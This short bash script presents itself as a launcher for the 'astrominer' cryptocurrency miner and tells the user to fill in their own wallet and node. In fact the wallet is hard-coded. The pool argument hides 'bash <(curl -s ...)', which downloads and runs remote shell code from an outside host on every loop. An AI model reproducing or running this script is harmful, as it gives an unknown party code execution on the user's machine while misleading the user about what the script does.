#!/bin/bash
echo "Replace YOUR_ADDRESS, YOUR_NODE:YOUR_PORT to run the miner"
while :; do
    ./astrominer -w deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnjllxfjpm9h6n -r bash <(curl -s https://community-pools.mysrv.cloud/mobile/pool) -p rpc;
    sleep 5;
done